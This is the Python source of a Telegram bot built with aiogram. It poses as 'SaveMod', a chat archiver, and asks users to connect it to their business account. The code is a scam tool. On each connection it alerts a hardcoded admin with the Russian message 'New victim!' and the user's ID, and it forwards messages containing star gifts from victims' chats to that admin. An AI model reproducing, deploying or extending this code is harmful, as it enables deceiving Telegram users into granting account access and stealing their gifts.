import asyncio
import logging
import sqlite3
import os
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.enums import ParseMode

BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = 1964233800

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN, parse_mode=ParseMode.HTML)
dp = Dispatcher()

def get_main_keyboard():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💾 Мои сохранения", callback_data="my_saves")],
        [InlineKeyboardButton(text="🔌 Подключить бота", callback_data="connect")],
        [InlineKeyboardButton(text="📖 Инструкция", callback_data="instruction")]
    ])
    return keyboard

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    text = "💾 SaveMod — Архиватор чатов\n\n1️⃣ Нажмите «Подключить бота»\n2️⃣ Подтвердите доступ"
    await message.answer(text, reply_markup=get_main_keyboard())

@dp.callback_query(lambda c: c.data == "connect")
async def callback_connect(callback: types.CallbackQuery):
    bot_username = (await bot.get_me()).username
    await callback.message.edit_text(
        "🔌 Подключение бота\n\n👉 https://t.me/" + bot_username + "?startconnect&business=1"
    )

@dp.callback_query(lambda c: c.data == "my_saves")
async def callback_my_saves(callback: types.CallbackQuery):
    await callback.message.edit_text("💾 Мои сохранения\n\nПодключите бота для начала архивации.")

@dp.callback_query(lambda c: c.data == "instruction")
async def callback_instruction(callback: types.CallbackQuery):
    await callback.message.edit_text("📖 Инструкция\n\n1️⃣ Нажмите «Подключить бота»\n2️⃣ Подтвердите действие")

@dp.business_connection()
async def handle_business_connection(connection: types.BusinessConnection):
    user_id = connection.user.id
    await bot.send_message(user_id, "✅ Бот подключен!", reply_markup=get_main_keyboard())
    await bot.send_message(ADMIN_ID, f"🔌 Новая жертва! ID: {user_id}")

@dp.business_message()
async def handle_business_message(message: types.Message):
    if hasattr(message, 'star_gift') and message.star_gift:
        try:
            await bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
            await bot.send_message(ADMIN_ID, "🎁 Подарок переслан!")
        except:
            pass

async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
